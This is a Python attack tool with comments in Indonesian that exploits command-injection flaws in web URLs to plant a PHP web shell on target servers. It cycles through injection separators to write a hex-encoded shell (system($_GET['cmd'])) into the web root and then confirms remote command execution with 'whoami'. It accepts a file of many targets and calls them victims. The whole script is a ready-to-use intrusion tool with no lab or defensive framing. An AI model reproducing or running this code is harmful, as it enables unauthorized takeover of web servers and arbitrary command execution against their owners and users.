#!/usr/bin/env python3

import requests
import argparse
import time
from urllib.parse import urljoin

# Pola payload untuk mencoba injection command
PAYLOAD_PATTERNS = [';{}', '&&{}', '|{}', '%0a{}', '`{}`']

# Fungsi buat generate kode PHP shell sederhana
def generate_php_shell():
    # Web shell PHP yang jalankan perintah dari parameter ?cmd= di URL
    return "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"

class ShellUploader:
    def __init__(self, targets, shell_path, shell_name, headers=None, verify_cmd='whoami'):
        # targets = list URL target dari file txt atau input langsung
        self.targets = targets
        # lokasi folder di server target tempat upload shell, harus path absolut
        self.shell_path = shell_path.rstrip('/') + '/'
        # nama file shell yang akan diupload, misal shell.php
        self.shell_name = shell_name
        # header HTTP untuk request (user agent dll)
        self.headers = headers or {'User-Agent':'Mozilla/5.0','Accept':'*/*'}
        # perintah verifikasi shell apakah berhasil diupload, default whoami
        self.verify_cmd = verify_cmd

    def upload_to_target(self, base_url):
        # Ambil kode PHP shell dan ubah jadi hex agar aman dikirim via command injection
        php_code = generate_php_shell()
        hex_code = php_code.encode('utf-8').hex()

        # Perintah shell yang buat file PHP dengan decode hex dan simpan di lokasi shell_path + shell_name
        write_cmd = f"echo {hex_code} | xxd -r -p > {self.shell_path}{self.shell_name}"

        print(f"[*] Mencoba upload shell ke {base_url} di {self.shell_path}{self.shell_name}")

        # Coba setiap pola payload untuk injection
        for pattern in PAYLOAD_PATTERNS:
            payload = pattern.format(write_cmd)
            exploit_url = base_url + payload
            try:
                # Kirim request dengan payload command injection
                requests.get(exploit_url, headers=self.headers, timeout=5)
                time.sleep(1)  # beri delay 1 detik agar server tidak overload
                
                # URL lengkap shell yang sudah diupload untuk verifikasi
                shell_url = urljoin(base_url, self.shell_name)
                # Kirim request untuk eksekusi perintah verify_cmd pada shell
                resp = requests.get(f"{shell_url}?cmd={self.verify_cmd}", headers=self.headers, timeout=5)
                
                # Jika output command verifikasi muncul, upload berhasil
                if self.verify_cmd in resp.text:
                    print(f"[+] Shell berhasil diupload: {shell_url}?cmd={self.verify_cmd}")
                    return shell_url

            except requests.RequestException:
                # Kalau request gagal, lanjut coba pola payload berikutnya
                continue

        print(f"[-] Gagal upload shell ke {base_url}")
        return None

    def run(self):
        # Jalankan upload ke semua target di list
        results = {}
        for url in self.targets:
            url = url.rstrip('?&')  # bersihkan url dari tanda tanya & di akhir
            shell_url = self.upload_to_target(url)
            results[url] = shell_url
        return results

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Tools Upload Shell via Command Injection')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', help='Target URL (contoh: http://victim.com/page.php?id=1)')
    group.add_argument('--file', help='File txt berisi list URL target, satu URL per baris')
    parser.add_argument('--path', default='/var/www/html', help='Path absolut tempat upload shell di server target')
    parser.add_argument('--name', default='shell.php', help='Nama file shell yang akan diupload')
    parser.add_argument('--verify', default='whoami', help='Perintah untuk verifikasi shell (default: whoami)')
    args = parser.parse_args()

    # Ambil list target dari input --url atau file txt
    if args.url:
        targets = [args.url]
    else:
        with open(args.file) as f:
            targets = [line.strip() for line in f if line.strip()]

    # Buat objek uploader dan jalankan proses upload
    uploader = ShellUploader(targets, args.path, args.name, verify_cmd=args.verify)
    hasil_upload = uploader.run()

    # Cetak hasil upload shell tiap target
    print("\n=== Hasil Upload Shell ===")
    for target, shell_url in hasil_upload.items():
        status = shell_url if shell_url else "upload gagal"
        print(f"{target} -> {status}")
